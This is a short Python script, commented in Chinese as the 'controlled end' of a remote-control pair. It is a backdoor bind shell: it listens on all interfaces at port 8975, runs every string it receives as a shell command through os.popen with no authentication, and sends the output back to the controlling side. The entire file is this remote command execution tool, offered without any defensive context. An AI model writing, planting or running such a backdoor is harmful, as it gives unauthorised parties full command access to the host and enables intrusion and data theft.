import socket,os

# 被控端-服务端
# 绑定监听端口
# 接受发送来的数据
# 数据进行命令执行
# 结果进行发回主控端

def set_socket():
    s = socket.socket()
    s.bind(('0.0.0.0', 8975))
    s.listen(5)
    flag = ''
    be_control(s)
def be_control(s):
    while True:
        sc, addr = s.accept()
        while True:
            cmd_order=sc.recv(102400).decode()
            flag=cmd_order
            if flag=='q':
                # print('主控端关闭了连接')
                sc.close()
                s.close()
                set_socket()
                break
            order_res = os.popen(cmd_order).read()
            sc.send(order_res.encode())


if __name__ == '__main__':
    set_socket()